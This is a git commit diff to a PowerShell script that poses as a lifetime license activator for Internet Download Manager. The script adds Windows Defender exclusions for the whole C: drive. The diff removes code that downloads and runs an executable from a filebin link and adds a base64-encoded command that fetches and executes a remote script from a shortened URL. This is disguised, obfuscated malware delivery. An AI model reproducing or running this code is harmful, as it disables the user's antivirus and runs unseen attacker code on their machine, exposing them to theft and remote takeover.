303b98cc4786ca1c3644d54c107f1b55258539f7
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-12-05 15:11:00 +0200

    Update IDM-Lifetime-license.ps1

--- IDM-Lifetime-license.ps1
+++ IDM-Lifetime-license.ps1
@@ -1,13 +1,7 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
 Add-MpPreference -ExclusionPath "C:\","IDM-Lifetime-license.exe","C:\Windows\Temp\"
-$url = "https://filebin.net/0amrx01k505y0b4g/IDMLifetimelicense.txt"
-$outpath = "C:\Windows\Temp\IDM-Lifetime-license.exe"
-Invoke-WebRequest -Uri $url -OutFile $outpath
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($url, $outpath)
-$args = @("Comma","Separated","Arguments")
-Start-Process -Filepath "C:\Windows\Temp\IDM-Lifetime-license.exe" -ArgumentList $args
+powershell.exe -encodedCommand aQBlAHgAKABpAHIAbQAgAGkAcwAuAGcAZAAvAHQAaQBnAGUAcgB4ACkA
 
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
